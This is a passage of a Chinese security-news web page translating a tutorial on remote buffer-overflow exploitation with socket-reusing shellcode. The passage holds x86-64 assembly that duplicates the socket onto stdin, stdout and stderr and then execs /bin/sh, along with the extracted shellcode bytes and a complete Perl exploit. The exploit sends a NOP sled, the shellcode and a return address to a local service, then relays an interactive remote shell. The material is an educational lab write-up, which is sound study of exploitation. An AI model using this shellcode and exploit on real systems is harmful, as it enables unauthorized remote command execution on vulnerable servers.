+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;rdi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;mov&nbsp;rdi,&nbsp;rax&nbsp;&nbsp;;&nbsp;dec&nbsp;rdi
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;;&nbsp;dup2&nbsp;(s,&nbsp;0);&nbsp;dup2(s,1);&nbsp;dup2(s,2)
+loop:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;al,&nbsp;33
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;DUP2&nbsp;(rax=33)&nbsp;rdi=oldfd&nbsp;(socket)&nbsp;rsi=newfd
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;rsi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;rax,rsi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;al,&nbsp;2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Loop&nbsp;0,1,2&nbsp;(stdin,&nbsp;stdout,&nbsp;stderr)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;loop
+&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;;&nbsp;exec&nbsp;(/bin/sh)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;rdx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;NULL
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;qword&nbsp;rdi,&nbsp;0x68732f6e69622f2f&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;&quot;//bin/sh&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;command
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;env
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;args
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;al,&nbsp;0x3b&nbsp;;EXEC&nbsp;(rax=0x4b)&nbsp;rdi=&quot;/bin/sh&quot;&nbsp;rsi=rdx=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对于不太容易理解的地方，我已经添加了相应的注释。同时，你可能也注意到了，代码里使用了许多的push/pop指令，这是因为一个PUSH/POP指令对占用2个字节，而MOV R1，R2指令则需要占用3个字节。虽然这会代码变得非常丑，但是却能节约一些空间...实际上也没有节约太多的地方，所以也算不上一个好主意。无论如何，您可以随意改进它，并欢迎在评论中发布您自己的版本。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">生成Shellcode</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，我们需要生成相应的shellcode，同时，其格式必须适合将其发送到远程服务器才行。为此，我们首先需要编译代码，然后从编译的文件中提取机器代码。编译代码非常简单，具体如下所示：</span></p><pre class="brush:plain;toolbar:false">nasm&nbsp;-f&nbsp;elf64&nbsp;-o&nbsp;rsh.o&nbsp;rsh.asm</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当然，从目标文件中获取二进制数据的方法有很多。我们这里使用的方法是生成具有易于添加到Perl或C程序中的格式的字符串。</span></p><pre class="brush:plain;toolbar:false">for&nbsp;i&nbsp;in&nbsp;$(objdump&nbsp;-d&nbsp;rsh.o&nbsp;-M&nbsp;intel&nbsp;|grep&nbsp;&quot;^&nbsp;&quot;&nbsp;|cut&nbsp;-f2);&nbsp;do&nbsp;echo&nbsp;-n&nbsp;&#39;\x&#39;$i;&nbsp;done;echo</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上面的两个命令将产生以下shellcode：</span></p><pre class="brush:plain;toolbar:false">\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来，我们就需要开始编写漏洞利用代码了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞利用代码</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">目前为止，我们已经搭设了一个带有远程利用漏洞的系统。同时，也了解了如何在低安全环境中利用缓冲区溢出漏洞，并生成了一个用于在远程系统上运行的shellcode。现在我们需要一个漏洞利用代码，把所有这些整合起来，从而获得我们梦寐以求的远程shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当然，编写漏洞利用代码的语言有很多，不过这里选用的是自己最熟悉的Perl。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们的漏洞利用代码具体如下所示：</span></p><pre class="brush:pl;toolbar:false">#!/usr/bin/perl
+use&nbsp;IO::Select;
+use&nbsp;IO::Socket::INET;
+$|=1;
+&nbsp;
+print&nbsp;&quot;Remote&nbsp;Exploit&nbsp;Example&quot;;
+print&nbsp;&quot;by&nbsp;0x00pf&nbsp;for&nbsp;0x00sec&nbsp;:)\n\n&quot;;
+&nbsp;
+#&nbsp;You&nbsp;may&nbsp;need&nbsp;to&nbsp;calculate&nbsp;these&nbsp;magic&nbsp;numbers&nbsp;for&nbsp;your&nbsp;system
+$addr&nbsp;=&nbsp;&quot;\x10\xdd\xff\xff\xff\x7f\x00\x00&quot;;&nbsp;
+$off&nbsp;=&nbsp;264;
+&nbsp;
+#&nbsp;Generate&nbsp;the&nbsp;payload
+$shellcode&nbsp;=&nbsp;&quot;\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05&quot;;
+&nbsp;
+$nops&nbsp;=&nbsp;$off&nbsp;-&nbsp;length&nbsp;$shellcode;
+$payload&nbsp;=&nbsp;&quot;\x90&quot;&nbsp;x&nbsp;$nops&nbsp;.&nbsp;$shellcode&nbsp;.&nbsp;$addr;
+&nbsp;
+$plen&nbsp;=&nbsp;length&nbsp;$payload;
+$slen&nbsp;=&nbsp;length&nbsp;$shellcode;
+print&nbsp;&quot;SLED&nbsp;$nops&nbsp;Shellcode:&nbsp;$slen&nbsp;Payload&nbsp;size:&nbsp;$plen\n&quot;;
+&nbsp;
+#&nbsp;Connect
+my&nbsp;$socket&nbsp;=&nbsp;new&nbsp;IO::Socket::INET&nbsp;(
+&nbsp;&nbsp;&nbsp;&nbsp;PeerHost&nbsp;=&gt;&nbsp;&#39;127.0.0.1&#39;,
+&nbsp;&nbsp;&nbsp;&nbsp;PeerPort&nbsp;=&gt;&nbsp;&#39;9000&#39;,
+&nbsp;&nbsp;&nbsp;&nbsp;Proto&nbsp;=&gt;&nbsp;&#39;tcp&#39;,
+&nbsp;&nbsp;&nbsp;&nbsp;);
+#&nbsp;Set&nbsp;up&nbsp;select&nbsp;for&nbsp;asynchronous&nbsp;read&nbsp;from&nbsp;the&nbsp;server
+$sel&nbsp;=&nbsp;IO::Select-&gt;new(&nbsp;$socket&nbsp;);
+$sel-&gt;add(\*STDIN);
+&nbsp;
+#&nbsp;Exploit!
+$socket-&gt;send&nbsp;($payload);
+$socket-&gt;recv&nbsp;($trash,1024);
+$timeout&nbsp;=&nbsp;.1;
+&nbsp;
+$flag&nbsp;=&nbsp;1;&nbsp;#&nbsp;Just&nbsp;to&nbsp;show&nbsp;a&nbsp;prompt
+&nbsp;
+#&nbsp;Interact!
+while&nbsp;(1)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(@ready&nbsp;=&nbsp;$sel-&gt;can_read&nbsp;($timeout))&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;$fh&nbsp;(@ready)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$flag&nbsp;=1;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($fh&nbsp;==&nbsp;$socket)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$socket-&gt;recv&nbsp;($resp,&nbsp;1024);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;$resp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;#&nbsp;It&nbsp;is&nbsp;stdin
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$line&nbsp;=&nbsp;&lt;STDIN&gt;;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$socket-&gt;send&nbsp;($line);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;#&nbsp;Show&nbsp;the&nbsp;prompt&nbsp;whenever&nbsp;everything&#39;s&nbsp;been&nbsp;read
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;0x00pf]&gt;&nbsp;&nbsp;&quot;&nbsp;if&nbsp;($flag);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$flag&nbsp;=&nbsp;0;
+&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞利用代码的开头部分几乎是标准式的。接下来，根据您利用gdb找出的魔法数字来生成payload（请注意，在您的系统中这些数字可能会有所不同，这样的话，这个漏洞利用代码，在您的系统中，可能就会无法正常工作）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后，我们必须针对自己的远程shell进行一些额外的工作。使用直接和反向shell时，一旦漏洞利用代码执行完毕，我们通常需要使用另一个程序/模块连接到远程机器，或接收来自远程机器的连接。为此，可以使用netcat或您喜欢的渗透测试平台，甚至是自己专门编写的工具...</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是，就本地而言，我们将使用已建立的连接来访问shell，这个连接就是之前用来发送payload的那个。所以我添加了一些代码，用来从stdin读取命令，并将它们发送到远程服务器，同时也从远程shell读取数据。这些都是些标准的网络代码，实在是没有什么特别之处。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，你可以尝试一下这个可以获取远程shell的漏洞利用代码了！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">小结</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在本文中，我们讨论了一种巧妙地技术，可以隐秘地获取shell来远程访问易受攻击的服务器，并且不需要跟系统提供的套接字API打交道。这使得shellcode的开发变得更简单，也使其更简洁（例如，你可以跟<a href="http://shell-storm.org/shellcode/files/shellcode-858.php2" _src="http://shell-storm.org/shellcode/files/shellcode-858.php2">http://shell-storm.org/shellcode/files/shellcode-858.php2</a></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">提供的代码比较一番。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">欢迎各位改进这个shellcode，并在评论中发布自己的版本。此外，如果有人想尝试在安全功能被激活情况下的漏洞利用的话，可以：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">重新激活ASLR（你已经知道如何做了）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">禁用堆栈的执行权限（删除-zexecstack标志或使用execstack工具）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">重新激活堆栈保护功能（删除-fno-stackprotector标志）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用更专业的安全编译选项（使用-DFORTIFY_SOURCE = 2选项进行编译，或使用-O2选项）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用更加严酷的安全编译选项（使用-O2 -fPIC -pie -fstack-protector-all -Wl，-z，relro，-z，now进行编译）</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440" target="_blank">原文链接：https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】远程漏洞利用：无需借助套接字的Shellcode - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3402" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment-none alarm-info bg-primary">无任何评论</div>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
